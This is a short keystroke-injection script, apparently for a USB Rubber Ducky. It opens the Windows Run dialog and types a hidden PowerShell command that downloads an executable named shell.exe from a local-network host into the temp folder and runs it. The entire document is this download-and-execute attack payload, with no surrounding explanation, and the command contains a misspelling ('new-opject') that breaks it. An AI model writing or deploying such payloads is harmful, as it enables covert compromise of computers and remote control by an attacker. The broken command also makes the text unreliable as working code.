DELAY 2000
GUI r
DELAY 1000
STRING powershell -windowstyle hidden (new-opject System.Net.WebClient).DownloadFile('http://192.168.0.125/shell.exe','%TEMP%\shell.exe'); Start-Process "%TEMP%\shell.exe"
ENTER